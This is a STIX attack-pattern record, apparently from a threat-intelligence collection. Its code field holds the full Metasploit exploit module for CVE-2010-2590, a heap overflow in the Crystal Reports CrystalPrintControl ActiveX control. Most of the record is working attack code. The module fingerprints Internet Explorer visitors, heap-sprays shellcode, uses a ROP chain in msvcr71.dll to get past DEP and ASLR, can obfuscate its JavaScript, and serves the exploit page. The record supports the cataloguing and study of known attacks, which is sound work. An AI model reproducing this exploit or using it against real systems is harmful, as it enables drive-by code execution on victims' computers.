{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--c5224798-984d-4b23-bec5-d84eeec96995",
    "created": "2024-08-14T16:43:35.999272Z",
    "modified": "2024-08-14T16:43:35.999276Z",
    "name": "\"Crystal Reports CrystalPrintControl ActiveX ServerResourceVersion Property Overflow\"",
    "description": " This module exploits a heap based buffer overflow in the CrystalPrintControl ActiveX, while handling the ServerResourceVersion property. The affected control can be found in the PrintControl.dll component as included with Crystal Reports 2008. This module has been tested successfully on IE 6, 7 and 8 on Windows XP SP3 and IE 8 on Windows 7 SP1. The module uses the msvcr71.dll library, loaded by the affected ActiveX control, to bypass DEP and ASLR.  'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/browser/crystal_reports_printcontrol.rb",
            "external_id": "crystal_reports_printcontrol.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2010-2590"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = NormalRanking\n\n  include Msf::Exploit::Remote::HttpServer::HTML\n  include Msf::Exploit::RopDb\n  #include Msf::Exploit::Remote::BrowserAutopwn\n  #\n  #autopwn_info({\n  #  :ua_name    => HttpClients::IE,\n  #  :ua_minver  => \"6.0\",\n  #  :ua_maxver  => \"8.0\",\n  #  :javascript => true,\n  #  :os_name => OperatingSystems::Match::WINDOWS,\n  #  :rank       => NormalRanking,\n  #  :classid    => \"{88DD90B6-C770-4CFF-B7A4-3AFD16BB8824}\",\n  #  :method     => \"ServerResourceVersion\"\n  #})\n\n\n  def initialize(info={})\n    super(update_info(info,\n      'Name'           => \"Crystal Reports CrystalPrintControl ActiveX ServerResourceVersion Property Overflow\",\n      'Description'    => %q{\n          This module exploits a heap based buffer overflow in the CrystalPrintControl\n        ActiveX, while handling the ServerResourceVersion property. The affected control\n        can be found in the PrintControl.dll component as included with Crystal Reports\n        2008. This module has been tested successfully on IE 6, 7 and 8 on Windows XP SP3\n        and IE 8 on Windows 7 SP1. The module uses the msvcr71.dll library, loaded by the\n        affected ActiveX control, to bypass DEP and ASLR.\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         =>\n        [\n          'Dmitriy Pletnev', # Vulnerability discovery\n          'Dr_IDE', # PoC\n          'juan vazquez' # Metasploit\n        ],\n      'References'     =>\n        [\n          [ 'CVE', '2010-2590' ],\n          [ 'OSVDB', '69917' ],\n          [ 'BID', '45387' ],\n          [ 'EDB', '15733' ]\n        ],\n      'Payload'        =>\n        {\n          'Space' => 890,\n          'BadChars' => \"\\x00\",\n          'DisableNops' => true,\n          'PrependEncoder' => \"\\x81\\xc4\\xa4\\xf3\\xfe\\xff\" # Stack adjustment # add esp, -500\n        },\n      'DefaultOptions'  =>\n        {\n          'InitialAutoRunScript' => 'post/windows/manage/priv_migrate'\n        },\n      'Platform'       => 'win',\n      'Targets'        =>\n        [\n          # Using jre rop because msvcr71.dll is installed with the ActiveX control\n          # Crystal Reports 2008 / PrintControl.dll 12.0.0.683\n          [ 'Automatic', {} ],\n          [ 'IE 6 on Windows XP SP3',\n            {\n              'Rop' => nil,\n              'Offset' => '0x5F4',\n              'Ret' => 0x0c0c0c08\n            }\n          ],\n          [ 'IE 7 on Windows XP SP3',\n            {\n              'Rop' => nil,\n              'Offset' => '0x5F4',\n              'Ret' => 0x0c0c0c08\n            }\n          ],\n          [ 'IE 8 on Windows XP SP3',\n            {\n              'Rop' => :jre,\n              'Offset' => '0x5f4',\n              'Ret' => 0x0c0c0c0c,\n              'Pivot' => 0x7c342643 # xchg eax, esp # pop edi # add byte ptr [eax],al # pop ecx # ret\n            }\n          ],\n          [ 'IE 8 on Windows 7',\n            {\n              'Rop' => :jre,\n              'Offset' => '0x5f4',\n              'Ret' => 0x0c0c0c0c,\n              'Pivot' => 0x7c342643 # xchg eax, esp # pop edi # add byte ptr [eax],al # pop ecx # ret\n            }\n          ]\n        ],\n      'Privileged'     => false,\n      'DisclosureDate' => '2010-12-14',\n      'DefaultTarget'  => 0))\n\n    register_options(\n      [\n        OptBool.new('OBFUSCATE', [false, 'Enable JavaScript obfuscation', false])\n      ])\n\n  end\n\n  def get_target(agent)\n    #If the user is already specified by the user, we'll just use that\n    return target if target.name != 'Automatic'\n\n    nt = agent.scan(/Windows NT (\\d\\.\\d)/).flatten[0] || ''\n    ie = agent.scan(/MSIE (\\d)/).flatten[0] || ''\n\n    ie_name = \"IE #{ie}\"\n\n    case nt\n    when '5.1'\n      os_name = 'Windows XP SP3'\n    when '6.0'\n      os_name = 'Windows Vista'\n    when '6.1'\n      os_name = 'Windows 7'\n    end\n\n    targets.each do |t|\n      if (!ie.empty? and t.name.include?(ie_name)) and (!nt.empty? and t.name.include?(os_name))\n        print_status(\"Target selected as: #{t.name}\")\n        return t\n      end\n    end\n\n    return nil\n  end\n\n  def ie_heap_spray(my_target, p)\n    js_code = Rex::Text.to_unescape(p, Rex::Arch.endian(target.arch))\n    js_nops = Rex::Text.to_unescape(\"\\x0c\"*4, Rex::Arch.endian(target.arch))\n    randnop = rand_text_alpha(rand(100) + 1)\n\n    # Land the payload at 0x0c0c0c0c\n    # For IE 6, 7, 8\n    js = %Q|\n    var heap_obj = new heapLib.ie(0x20000);\n    var code = unescape(\"#{js_code}\");\n    var #{randnop} = \"#{js_nops}\";\n    var nops = unescape(#{randnop});\n    while (nops.length < 0x80000) nops += nops;\n    var offset = nops.substring(0, #{my_target['Offset']});\n    var shellcode = offset + code + nops.substring(0, 0x800-code.length-offset.length);\n    while (shellcode.length < 0x40000) shellcode += shellcode;\n    var block = shellcode.substring(0, (0x80000-6)/2);\n    heap_obj.gc();\n    for (var i=1; i < 0x300; i++) {\n      heap_obj.alloc(block);\n    }\n    |\n\n    js = heaplib(js, {:noobfu => true})\n\n    if datastore['OBFUSCATE']\n      js = ::Rex::Exploitation::JSObfu.new(js)\n      js.obfuscate(memory_sensitive: true)\n    end\n\n    return js\n  end\n\n  def get_payload(t, cli)\n    code = payload.encoded\n\n    # No rop. Just return the payload.\n    return code if t['Rop'].nil?\n\n    # Both ROP chains generated by mona.py - See corelan.be\n    print_status(\"Using JRE ROP\")\n    rop_payload = generate_rop_payload('java', code, {'pivot' => [t['Pivot']].pack(\"V\")})\n\n    return rop_payload\n  end\n\n  def load_exploit_html(my_target, cli)\n    p  = get_payload(my_target, cli)\n    js = ie_heap_spray(my_target, p)\n\n    # This rop chain can't contain NULL bytes, because of this RopDB isn't used\n    # rop chain generated with mona.py\n    rop_gadgets =\n      [\n        0x7c37653d, # POP EAX # POP EDI # POP ESI # POP EBX # POP EBP # RETN\n        0xfffffdff,\t# Value to negate, will become 0x00000201 (dwSize)\n        0x7c347f98,\t# RETN (ROP NOP) [msvcr71.dll]\n        0x7c3415a2,\t# JMP [EAX] [msvcr71.dll]\n        0xffffffff,\t#\n        0x7c376402,\t# skip 4 bytes [msvcr71.dll]\n        0x7c351e05,\t# NEG EAX # RETN [msvcr71.dll]\n        0x7c345255,\t# INC EBX # FPATAN # RETN [msvcr71.dll]\n        0x7c352174,\t# ADD EBX,EAX # XOR EAX,EAX # INC EAX # RETN [msvcr71.dll]\n        0x7c344f87,\t# POP EDX # RETN [msvcr71.dll]\n        0xffffffc0,\t# Value to negate, will become 0x00000040\n        0x7c351eb1,\t# NEG EDX # RETN [msvcr71.dll]\n        0x7c34d201,\t# POP ECX # RETN [msvcr71.dll]\n        0x7c38b001,\t# &Writable location [msvcr71.dll]\n        0x7c347f97,\t# POP EAX # RETN [msvcr71.dll]\n        0x7c37a151,\t# ptr to &VirtualProtect() - 0x0EF [IAT msvcr71.dll]\n        0x7c378c81,\t# PUSHAD # ADD AL,0EF # RETN [msvcr71.dll]\n        0x7c345c30,\t# ptr to 'push esp #  ret ' [msvcr71.dll]\n      ].pack(\"V*\")\n\n    # Allow to easily stackpivot to the payload\n    # stored on the sprayed heap\n    stackpivot_to_spray = %Q|\n      mov esp, 0x0c0c0c10\n      ret\n    |\n\n    # Space => 0x940 bytes\n    # 0x40c: Fill the current CrystalPrintControl object\n    # 0x8: Overflow next heap chunk header\n    # 0x52c: Overflow next CrystalPrintControl object until the ServerResourceVersion offset\n    bof = rand_text_alpha(1036)\n    bof << [0x01010101].pack(\"V\") # next heap chunk header\n    bof << [0x01010101].pack(\"V\") # next heap chunk header\n    bof << [my_target.ret].pack(\"V\")\n    bof << [0x7c3410c4].pack(\"V\") # ret # msvcr71\n    bof << [0x7c3410c4].pack(\"V\") # ret # msvcr71\n    bof << [0x7c3410c4].pack(\"V\") # ret # msvcr71\n    bof << [0x7c3410c4].pack(\"V\") # ret # msvcr71\n    bof << [0x7c3410c4].pack(\"V\") # ret # msvcr71\n    bof << [0x7c3410c4].pack(\"V\") # ret # msvcr71\n    bof << [0x7c3410c4].pack(\"V\") # ret # msvcr71\n    bof << [0x7c3410c4].pack(\"V\") # ret # msvcr71 # eip for w7 sp0 / ie8\n    bof << rop_gadgets\n    bof << Metasm::Shellcode.assemble(Metasm::Ia32.new, stackpivot_to_spray).encode_string\n    bof << rand_text_alpha(0x940 - bof.length)\n\n    js_bof = Rex::Text.to_unescape(bof, Rex::Arch.endian(my_target.arch))\n\n    target = rand_text_alpha(5 + rand(3))\n    target2 = rand_text_alpha(5 + rand(3))\n    target3 = rand_text_alpha(5 + rand(3))\n    target4 = rand_text_alpha(5 + rand(3))\n    target5 = rand_text_alpha(5 + rand(3))\n    target6 = rand_text_alpha(5 + rand(3))\n    target7 = rand_text_alpha(5 + rand(3))\n    target8 = rand_text_alpha(5 + rand(3))\n    target9 = rand_text_alpha(5 + rand(3))\n    target10 = rand_text_alpha(5 + rand(3))\n    target11 = rand_text_alpha(5 + rand(3))\n    target12 = rand_text_alpha(5 + rand(3))\n    target13 = rand_text_alpha(5 + rand(3))\n    target14 = rand_text_alpha(5 + rand(3))\n    target15 = rand_text_alpha(5 + rand(3))\n\n    # - 15 CrystalPrintControl objects are used to defragement the heap.\n    # - The 10th CrystalPrintControl is overflowed.\n    # - After the overflow, trying to access the overflowed object, control\n    # can be obtained.\n    html = %Q|\n    <html>\n    <head>\n    <script>\n    #{js}\n    </script>\n    </head>\n    <body>\n    <object id='#{target}' classid='clsid:88DD90B6-C770-4CFF-B7A4-3AFD16BB8824'></object>\n    <object id='#{target2}' classid='clsid:88DD90B6-C770-4CFF-B7A4-3AFD16BB8824'></object>\n    <object id='#{target3}' classid='clsid:88DD90B6-C770-4CFF-B7A4-3AFD16BB8824'></object>\n    <object id='#{target4}' classid='clsid:88DD90B6-C770-4CFF-B7A4-3AFD16BB8824'></object>\n    <object id='#{target5}' classid='clsid:88DD90B6-C770-4CFF-B7A4-3AFD16BB8824'></object>\n    <object id='#{target6}' classid='clsid:88DD90B6-C770-4CFF-B7A4-3AFD16BB8824'></object>\n    <object id='#{target7}' classid='clsid:88DD90B6-C770-4CFF-B7A4-3AFD16BB8824'></object>\n    <object id='#{target8}' classid='clsid:88DD90B6-C770-4CFF-B7A4-3AFD16BB8824'></object>\n    <object id='#{target9}' classid='clsid:88DD90B6-C770-4CFF-B7A4-3AFD16BB8824'></object>\n    <object id='#{target10}' classid='clsid:88DD90B6-C770-4CFF-B7A4-3AFD16BB8824'></object>\n    <object id='#{target11}' classid='clsid:88DD90B6-C770-4CFF-B7A4-3AFD16BB8824'></object>\n    <object id='#{target12}' classid='clsid:88DD90B6-C770-4CFF-B7A4-3AFD16BB8824'></object>\n    <object id='#{target13}' classid='clsid:88DD90B6-C770-4CFF-B7A4-3AFD16BB8824'></object>\n    <object id='#{target14}' classid='clsid:88DD90B6-C770-4CFF-B7A4-3AFD16BB8824'></object>\n    <object id='#{target15}' classid='clsid:88DD90B6-C770-4CFF-B7A4-3AFD16BB8824'></object>\n    <script>\n    var ret = unescape('#{js_bof}');\n    #{target9}.ServerResourceVersion = ret;\n    var c = #{target10}.BinName.length;\n    </script>\n    </body>\n    </html>\n    |\n\n    return html\n  end\n\n  def on_request_uri(cli, request)\n    agent = request.headers['User-Agent']\n    uri   = request.uri\n    print_status(\"Requesting: #{uri}\")\n\n    my_target = get_target(agent)\n    # Avoid the attack if no suitable target found\n    if my_target.nil?\n      print_error(\"Browser not supported, sending 404: #{agent}\")\n      send_not_found(cli)\n      return\n    end\n\n    html = load_exploit_html(my_target, cli)\n    html = html.gsub(/^ {4}/, '')\n    print_status(\"Sending HTML...\")\n    send_response(cli, html, {'Content-Type'=>'text/html'})\n  end\nend\n",
    "x_mitre_disclosure_date": "2010-12-14",
    "x_mitre_platforms": [
        "win'"
    ]
}